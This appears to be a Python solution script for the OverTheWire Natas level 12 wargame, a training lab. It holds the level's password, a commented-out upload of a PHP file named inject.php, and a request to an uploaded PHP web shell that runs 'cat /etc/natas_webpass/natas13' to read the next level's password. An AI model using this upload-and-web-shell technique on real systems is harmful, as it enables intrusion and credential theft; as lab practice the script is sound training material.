#!/usr/bin/env python3
import requests
import re

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

with open('natas12.html', 'w+') as out:
    url = 'http://%s.natas.labs.overthewire.org' % username

    s = requests.Session()
    # filename is uploadedfile;
    # document:'https://docs.python-requests.org/en/latest/user/quickstart/#post-a-multipart-encoded-file';
    # files = {'uploadedfile': open('inject.php', 'rb')}

    # r = s.get(url, auth = (username, password))
    r = s.get(url + "/upload/n3gyharw2n.php?c=cat /etc/natas_webpass/natas13", auth = (username, password))
    # r = s.post(url, files = {'uploadedfile': open('inject.php', 'rb')}, data = {'filename':'inject.php', 'MAX_FILE_SIZE':'1000'}, auth =(username, password))
    
    
    content = r.text

    out.write(content)

